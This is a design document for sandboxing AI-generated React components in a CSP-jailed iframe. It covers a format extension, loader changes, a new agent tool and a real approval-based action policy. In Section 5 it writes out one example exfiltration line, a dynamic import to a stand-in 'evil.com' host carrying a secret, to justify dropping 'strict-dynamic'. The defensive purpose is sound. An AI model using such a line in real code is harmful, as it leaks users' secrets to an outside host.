# Flowlet Tier 2.5 — AI-generated components in the tight sandbox (Design)

- **Date:** 2026-07-01
- **Status:** Design approved in brainstorming (Q1–Q5 locked with user); codex-reviewed (10 findings, all folded in below); pending user spec review.
- **Builds on:** F3a stage (merged), F3b GenUI format + resolver (merged, previously unfed), F2 agent core (policy layer), F4 component library.
- **Scope decision (Q5 = C):** capability path **plus** a real (non-allow-all) action policy. Retiring/jailing the loose Tier 2 `HtmlApp` iframe is a documented follow-up, **not** built here.

## 1. Problem

Flowlet has three render tiers today:

1. **Prewired components** — trusted, in-process, static; the demo's default.
2. **Raw HTML app** (`HtmlApp`) — arbitrary AI code in a *loose* iframe (`sandbox="allow-scripts"`, no CSP): flexible but can phone home, off-brand, sealed off from app data/actions.
3. **GenUI sandbox** (F3b) — catalog-only composition in the *tight* F3a iframe (CSP egress jail, opaque origin, themed, governed action bridge). Fully built, but **no producer feeds it**.

The gap: **novel, AI-written UI that is also egress-jailed, branded, data-bound, and action-capable.** Tier 2's freedom with Tier 3's safety. That is this feature.

## 2. Locked decisions (from brainstorming)

- **Q1 — Capability-first (B):** generated *component code* that meshes with the GenUI tree; not merely re-boxing the HTML-app path.
- **Q2 — Shape (A):** the AI emits a **React function component as a code string**, evaluated in-sandbox and mounted as a tree node.
- **Q3 — Trust model (A):** **one trust domain inside the box.** No internal walls between generated code, catalog impls, React, and the bridge. The security fence is the box's two edges:
  1. CSP egress jail + opaque origin — data cannot leave;
  2. host-side action policy — every dispatch is governed on the host.
  Hard dependencies this creates: the action policy must not be allow-all (built here, §7), and host state projection must stay scoped (already the F3a contract).
- **Q4 — Carrier (A):** `GeneratedPayload.components?: Record<string, string>` (name → code) + one new agent tool, `render_view`, that emits a whole payload as a `kind: "generated"` node — finally feeding the dormant F3b pipeline.
- **Q5 — Scope (C):** capability + real policy. `HtmlApp` retirement is follow-up work.

## 3. Architecture & data flow

```
Agent (LLM)
  │  render_view(payload)
  ▼
GeneratedPayload { formatVersion, root, nodes[], data?, components? }
  │  written to stream as a kind:"generated" UINode
  ▼
Host (stage-adapter)
  │  createGenUISession → validate → resolve tree      (existing)
  │  generated code shipped to the sandbox at init      (new)
  ▼
Tight sandbox (F3a iframe)
  │  name resolution: prewired primitive → host catalog → generated map   (new 3rd step)
  │  generated code loaded via blob-URL import()        (existing loadBundle mechanism)
  │  per-node error boundary                            (existing)
  ▼
Rendered view: novel + catalog + primitives, one shared data model, egress-jailed
  │  user interaction → flowlet.dispatch(action) → host bridge
  ▼
Host policy (REAL, built here) → auto-allow / approval card / deny → tool execution
```

Reused as-is: `generated` node kind, `GeneratedPayload` validation/resolution, `ui-delta` streaming, blob-import bundle loading, the action bridge, per-node error boundaries, theming. New: the `components` field, the third resolution step, the `render_view` tool, the policy wiring, and **one CSP hardening** (dropping `'strict-dynamic'`, §5) that the one-realm trust model requires.

## 4. Format extension (`@flowlet/core`)

`GeneratedPayload` gains one optional field:

```ts
interface GeneratedPayload {
  formatVersion: "flowlet-genui/v1";   // unchanged — additive, old payloads stay valid
  root: string;
  nodes: GenNode[];
  data?: Record<string, unknown>;
  components?: Record<string, string>; // NEW: name → ESM component source
}
```

- A `GenNode` references a generated component with `source: "generated"` (new member of the source union) and `component: <name in the map>`. The `"generated"` member must be added to **every** source union it flows through: `GenNode.source`, `UINodeSource` (`core/ui.ts`), the registry types, and the stage capability/protocol types — they currently all hardcode `"prewired" | "host"`.
- **Validation (extends `validateGeneratedPayload`):**
  - names must match `^[A-Z][A-Za-z0-9]*$` and must not collide with prewired primitive names (host-catalog collisions are impossible: `source` disambiguates);
  - caps: ≤ 16 components per payload, ≤ 64 KB source per component, ≤ 256 KB total (provision error beyond, consistent with existing DoS caps);
  - a node with `source: "generated"` whose name is missing from the map is a **validation-time provision error**. Note this is deliberately stricter than dangling *child ids*, which the resolver by design tolerates and renders as `Skeleton` (a streaming affordance): a missing child may still arrive; a missing component definition never will.
- **No JSX.** Sandbox has no transform and CSP forbids eval-based compilation. Generated source is plain-JS ESM using `React.createElement`, importing React through the stage's **existing import map** (`import React from "react"` — `buildSrcdoc` already maps `react`/`react-dom`/`react/jsx-runtime` to the shim blob). The `render_view` tool description instructs the model accordingly; a `h`-style alias is allowed inside the generated module if the model wants one.

## 5. Sandbox runtime changes (`@flowlet/stage`)

- **CSP hardening (required by this feature):** the current policy is `script-src 'nonce-…' 'strict-dynamic' blob:`. `'strict-dynamic'` lets any trusted script dynamically load **any URL** (allowlists are ignored) — once AI-written code runs in the realm, `import("https://evil.com/x?" + secret)` becomes an exfil channel that `connect-src 'none'` does not cover (it governs fetch/XHR/WS/beacons, not script loads). Fix: drop `'strict-dynamic'`, keep `script-src 'nonce-…' blob:`. All legitimate loading (React shim, host bundle, generated modules) is blob-URL `import()` and keeps working; remote script loads get blocked. This corrects the earlier "no CSP changes" assumption.
- **Init payload** gains `generatedComponents?: Record<string, string>` alongside `bundleSource`/`tree`.
- **Loading:** for each entry, the runtime wraps the source as an ESM blob module and `import()`s it — the same mechanism `loadBundle` already uses. Modules load per-name into `{ components, errors }`: a module that fails to load/evaluate, or whose default export is not a function, records an error sentinel for that name and **does not** fail the render pass. (Today's whole-`render()` catch happens after `ui/initialize` acks and can leave the stage blank; generated-module failures must be contained per name, not per render.)
- **Module contract** (explicit — ESM has no "injected bindings"):
  - the module imports React itself: `import React from "react"` (existing import map, §4);
  - it `export default`s a function component;
  - the runtime passes `flowlet` **as a prop**: `{ dispatch(action) → Promise<result> }`, a **per-node closure with the origin node id fixed by the runtime**. Generated code never receives the ambient origin-accepting `window.__flowletDispatch(descriptor, originNodeId)` API — in a one-realm model any code can name any node id, so `originNodeId` must not be treated as a security boundary anywhere on the host either (the policy decides on the *action*, not on which node claims to have sent it);
  - other props are data-bound via `$path` before mount like every node, and `children` may be catalog components — this is the meshing.
- **Resolution order** in `buildElement`: prewired `PRIMITIVES` table → host bundle (`host[name]`) → **generated map**. `source: "generated"` skips straight to the map; a name resolving to an error sentinel renders the contained error placeholder for that node only. The `[generated]` placeholder branch in the runtime is replaced by real resolution.
- **Failure containment:** per-name error sentinels (above) for load/shape failures; the existing per-node error boundary catches render-time throws. Siblings always render.
- **Re-render/delta:** unchanged for data (`ui-delta` prop patches). A change to the `components` map is a structural change → full re-init.

## 6. Agent tool (`@flowlet/agent`)

New `createRenderViewTool(writer)` next to the existing `createRenderTool`:

- **Input schema (zod):** the full `GeneratedPayload` shape (formatVersion, root, nodes, data?, components?).
- **Execute:** run `validateGeneratedPayload` server-side first; on failure return the typed error message to the model (so it can self-correct in-turn) instead of streaming a broken node; on success write `{ type: "data-ui", data: { kind: "generated", id, payload } }`.
- **Engine + shell integration** (not just a new tool file): export a `RENDER_VIEW_TOOL_NAME` constant and register the tool in the engine beside `render_ui` (`engine.ts` currently registers only `render_ui`); update the shell's tool-chip normalization (`use-flowlet-thread.ts` suppresses only `render_ui` today) so `render_view` calls don't leak raw tool chips into the transcript.
- **System-prompt contract** (demo-bank `agent.ts`): teach the model when to use `render_ui` (one simple component) vs `render_view` (a composed view, novel UI, or anything needing layout/data-binding); document the no-JSX/`import React from "react"`/`React.createElement` requirement, the `flowlet.dispatch` prop, `$path` bindings, and the caps.

## 7. Real action policy (replaces demo allow-all)

The policy layer already exists in `@flowlet/agent` (annotation rules, principal rules, natural-language rules, composition — decisions are `allow | approve | deny`). What's missing is using it. This effort:

- **Replaces `allowAllPolicy` in demo-bank** with a composed policy:
  - read-only / annotated-safe tools (`getTransactions`, catalog renders) → `allow`;
  - external side-effect tools (Slack post, Gmail send, anything Composio-write) → `approve` — surfaced through the existing `ApprovalCard` / approval-pending dispatch flow (already built in shell + runtime);
  - natural-language remember-rules keep working on top (Beat 3 unchanged: its Slack post is authorized by the user's standing rule).
- **A stage action host** — the missing bridge between the sandbox and the policy. Today the two are disjoint: policy wraps *AI-SDK tools* (`buildToolset`/`wrapTool`), while `FlowletStage` actions go to an `onAction` callback that demo-bank doesn't even pass (the adapter then defaults to `{ result: null }` — a silent allow-nothing bypass). This effort specifies and builds the host: it maps an `ActionRequest` to a tool descriptor, evaluates the **same composed `ApprovalPolicy`**, drives `approve` decisions through the approval-pending flow (`resolveAction`/`cancelAction`), and executes allowed actions against the same tool implementations the agent uses. A generated component's `flowlet.dispatch` is thereby not a second door.
- Per §5: the policy evaluates the *action*; `originNodeId` is bookkeeping, never a trust input.
- Non-goal: new policy *features*. This is wiring existing machinery so the Q3 trust model's precondition ("policy must not be allow-all") is true.

## 8. Host wiring (`@flowlet/react` + demo-bank)

- `stage-adapter` passes `payload.components` through `createGenUISession`/`initialize` to the stage. The structure key is today **only** `JSON.stringify(payload.nodes)` — it must also fingerprint `payload.components ?? {}`, or a code-only change with identical nodes takes the data-delta path and never reloads modules.
- **demo-bank must actually provision the stage.** `render-node.tsx` currently mounts `<FlowletStage node={node} components={prewiredComponents} />` with no `reactSource`, no `bundleSource`, and no `onAction` — so the sandbox has no React, no catalog impls, and a null action sink. This effort adds: a **built sandbox host bundle** for `@flowlet/components` (sets `__FLOWLET_HOST__`; a build artifact of the components package), the React shim via `reactSource`, and an `onAction` wired to the §7 stage action host. Without this the meshing has nothing to mesh.
- Otherwise `render-node.tsx` needs **no new branch**: `kind: "generated"` already routes to `FlowletStage`. The `App`/`HtmlApp` branch stays as-is (follow-up work).

## 9. Security posture (what keeps this safe)

1. **No egress:** generated code runs in an opaque-origin iframe under a CSP hardened by this effort (§5): `script-src 'nonce-…' blob:` (no `'strict-dynamic'`), `connect-src 'none'`, `default-src 'none'`, `img-src data:` only. That closes all three exfil families: network APIs (connect-src), resource beacons (img/font restricted to `data:`), and remote script/module loads (the strict-dynamic hole).
2. **Governed actions only:** the only host-reaching capability handed to generated code is the per-node `flowlet.dispatch` prop, which resolves on the host through the real policy (§7) with approval UI for powerful actions. `originNodeId` is never a trust input.
3. **Scoped state:** generated code sees only the state slice the host projects (existing F3a contract) and the payload's own `data`.
4. **Resource caps:** component count/size caps (§4) + existing node/depth/op caps bound hostile payloads.
5. **Residual risks accepted:** in-sandbox CPU burn (mitigatable later with a watchdog; out of scope), and anything the *policy* allows — the policy is the fence, which is why §7 is in scope.

## 10. Testing

- **`@flowlet/core`:** validator accepts/rejects the new field (caps, name rules, dangling generated refs); resolver passes `source: "generated"` nodes through.
- **`@flowlet/stage` (unit):** init-payload plumbing; resolution order (primitive shadowing, host vs generated); module-shape errors contained per-node.
- **`@flowlet/stage` (browser suite):** a generated component actually evaluates, mounts, receives props/children, dispatches an action round-trip; egress gates (same harness as the F3a spike gates): `fetch()` blocked, **and** `import("https://…")` + dynamic `<script src>` insertion blocked (regression tests for the strict-dynamic fix); a throwing generated component leaves siblings rendered; a failing-to-load module yields a placeholder for its nodes only.
- **`@flowlet/agent`:** `render_view` validates before streaming; invalid payload returns model-visible error; policy composition — read tool allows, Slack-write returns `approve`, remember-rule authorizes Beat 3; stage action host maps `ActionRequest` → descriptor → same policy → approval-pending round-trip.
- **demo-bank (manual/visual):** per the visual-verification rule, render a meshed view (novel component + catalog Chart side by side) and screenshot; exercise one approval flow end-to-end.

## 11. Follow-ups (documented, not built here)

1. **Retire or jail `HtmlApp` (Tier 2):** migrate full-document generated apps into the tight sandbox or give the loose iframe a real CSP; until then the dino-game path can still phone home.
2. **CPU/robustness watchdog** for runaway generated code.
3. **JSX authoring convenience** (host-side transpile step) if `React.createElement` output proves error-prone for the model.
